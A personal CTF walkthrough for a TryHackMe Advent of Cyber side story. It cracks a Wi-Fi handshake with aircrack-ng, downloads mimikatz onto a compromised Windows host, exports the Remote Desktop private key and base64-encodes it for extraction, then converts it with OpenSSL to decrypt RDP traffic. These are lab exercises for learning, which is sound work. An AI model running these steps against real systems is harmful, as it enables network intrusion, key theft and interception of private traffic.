---
tags:
  - THM
  - AoC
  - AdevntOfCyber
  - Sidestory
  - mimkatz
  - mimikatzDefaultPassword
---
# Side story 1

---

Attacker: 10.3
Elf: 10.2
Server: 10.1.1.1

---

## Wi-Fi Password

`wlan.fc.type_subtype == 0x08 || wlan.fc.type_subtype == 0x05 || eapol && wlan.addr==84:C9:B2:52:F6:37`

```bash
tcpdump -r VanSpy.pcapng -w tcpdump.pcap
aircrack-ng -w ~/_mindrefined/hacks/SecLists/Passwords/Leaked-Databases/rockyou.txt -b 22:c7:12:c7:e2:35 ~/_mindrefined/hacks/thm/AoC2023/sidestories/one/tcpdump.pcap
```

### Decrypting and Analyzing Traffic in Wireshark

To view the decrypted traffic in Wireshark:

1. Open the pcap file in Wireshark
2. Go to: Edit > Preferences > Protocols > IEEE 802.11 > Decryption Keys > Edit > New (+)
3. Select key type: **wpa-pwd**
4. Enter the key in the following format: **password:ssid**
5. Click OK, then OK again. Wireshark will refresh the display with decrypted traffic. Set the display filter to “ip” to filter out all of the wireless noise.

---

## Find Program

`tcp.scrport == 4444`

### Windows PowerShell running as user Administrator on INTERN-PC

Copyright (C) Microsoft Corporation. All rights reserved.

```powershell
PS C:\Users\Administrator> dir

Directory: C:\Users\Administrator

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----       11/23/2023   9:47 PM                .ssh
d-r---        3/17/2021   3:13 PM                3D Objects
d-r---        3/17/2021   3:13 PM                Contacts
d-r---       11/25/2023   2:12 PM                Desktop
d-r---        3/17/2021   3:13 PM                Documents
d-r---       11/24/2023  10:53 PM                Downloads
d-r---        3/17/2021   3:13 PM                Favorites
d-r---        3/17/2021   3:13 PM                Links
d-r---        3/17/2021   3:13 PM                Music
d-r---       11/24/2023  10:44 PM                Pictures
d-r---        3/17/2021   3:13 PM                Saved Games
d-r---        3/17/2021   3:13 PM                Searches
d-r---        3/17/2021   3:13 PM                Videos
-a----       11/25/2023   6:01 AM           8192 psh4444.exe

PS C:\Users\Administrator> whoami
intern-pc\administrator
PS C:\Users\Administrator> wget https://github.com/gentilkiwi/mimikatz/releases/download/2.2.0-20220919/mimikatz_trunk.zip -O mimi.zip
PS C:\Users\Administrator> Expand-Archive .\mimi.zip
PS C:\Users\Administrator> mv mimi/x64/mimikatz.exe .
```

```powershell
PS C:\Users\Administrator> cmd /c mimikatz.exe privilege::debug token::elevate crypto::capi "crypto::certificates /systemstore:LOCAL_MACHINE /store:\`"Remote Desktop\`" /export" exit

.#####.   mimikatz 2.2.0 (x64) #19041 Sep 19 2022 17:44:08
.## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
## \ / ##       > https://blog.gentilkiwi.com/mimikatz
'## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
'#####'        > https://pingcastle.com / https://mysmartlogon.com ***/

mimikatz(commandline) # privilege::debug
Privilege '20' OK

mimikatz(commandline) # token::elevate
Token Id  : 0
User name : 
SID name  : NT AUTHORITY\SYSTEM

496 {0;000003e7} 1 D 16529      NT AUTHORITY\SYSTEM S-1-5-18 (04g,21p) Primary -> Impersonated !
 * Process Token : {0;0002bbfa} 2 D 25564822   INTERN-PC\Administrator S-1-5-21-1966530601-3185510712-10604624-500 (14g,24p) Primary
 * Thread Token  : {0;000003e7} 1 D 25609341   NT AUTHORITY\SYSTEM S-1-5-18 (04g,21p) Impersonation (Delegation)

mimikatz(commandline) # crypto::capi
Local CryptoAPI RSA CSP patched
Local CryptoAPI DSS CSP patched

mimikatz(commandline) # crypto::certificates /systemstore:LOCAL_MACHINE /store:"Remote Desktop" /export

* System Store  : 'LOCAL_MACHINE' (0x00020000)
* Store         : 'Remote Desktop'

0. INTERN-PC
   Subject  : CN=INTERN-PC
   Issuer   : CN=INTERN-PC
   Serial   : ffb1d93a1df0324cadd5e13f3f9f1b51
   Algorithm: 1.2.840.113549.1.1.1 (RSA)
   Validity : 11/22/2023 9:18:19 PM -> 5/23/2024 9:18:19 PM
   Hash SHA1: a0168513fd57577ecc0204f01441a3bd5401ada7
   Key Container  : TSSecKeySet1
   Provider       : Microsoft Enhanced Cryptographic Provider v1.0
   Provider type  : RSA_FULL (1)
   Type           : AT_KEYEXCHANGE (0x00000001)
   |Provider name : Microsoft Enhanced Cryptographic Provider v1.0
   |Key Container : TSSecKeySet1
   |Unique name   : f686aace6942fb7f7ceb231212eef4a4_c5d2b969-b61a-4159-8f78-6391a1c805db
   |Implementation: CRYPT_IMPL_SOFTWARE ; 
   Algorithm      : CALG_RSA_KEYX
   Key size       : 2048 (0x00000800)
   Key permissions: 0000003b ( CRYPT_ENCRYPT ; CRYPT_DECRYPT ; CRYPT_READ ; CRYPT_WRITE ; CRYPT_MAC ; )
   Exportable key : NO
   Public export  : OK - 'LOCAL_MACHINE_Remote Desktop_0_INTERN-PC.der'
   Private export : OK - 'LOCAL_MACHINE_Remote Desktop_0_INTERN-PC.pfx'

mimikatz(commandline) # exit
Bye!
```

```powershell
PS C:\Users\Administrator> dir

Directory: C:\Users\Administrator

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----       11/23/2023   9:47 PM                .ssh
d-r---        3/17/2021   3:13 PM                3D Objects
d-r---        3/17/2021   3:13 PM                Contacts
d-r---       11/25/2023   2:56 PM                mimi
d-r---        3/17/2021   3:13 PM                Music
d-r---       11/24/2023  10:44 PM                Pictures
d-r---        3/17/2021   3:13 PM                Saved Games
d-r---        3/17/2021   3:13 PM                Searches
d-r---        3/17/2021   3:13 PM                Videos
-a----       11/25/2023   2:56 PM            730 LOCAL_MACHINE_Remote Desktop_0_INTERN-PC.der
-a----       11/25/2023   2:56 PM           2493 LOCAL_MACHINE_Remote Desktop_0_INTERN-PC.pfx
-a----       11/25/2023   2:56 PM        1206166 mimi.zip
-a----        9/19/2022   4:44 PM        1355264 mimikatz.exe
-a----       11/25/2023   6:01 AM           8192 psh4444.exe
```

```powershell
PS C:\Users\Administrator> [Convert]::ToBase64String([IO.File]::ReadAllBytes("/users/administrator/LOCAL_MACHINE_Remote Desktop_0_INTERN-PC.pfx"))
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
PS C:\Users\Administrator> exit
```

Follow ups:

- Decode the Key: `cat LOCAL_MACHINE_Remote Desktop_0_INTERN-PC.pfx.bas64.encoded.txt | base64 -d > decoded.pfx`
- Transform `.pfx` to `.pem` (4wireshark) `openssl pkcs12 -in decoded.pfx -nocerts -out remote.pem -nodes`
 	- **ATTENTION**: Default paasword is `mimikatz`
- remove Passwd from `.pem` to `.key`: `openssl rsa -in remote.pem -out remote-passwd.key`

![Pasted image 20231225104923.png](Pasted image 20231225104923.png.md)

TLS_RSA_WITH_AES_256_GCM_SHA384

---

irrelevant

`eapol.type == 3` -> export packages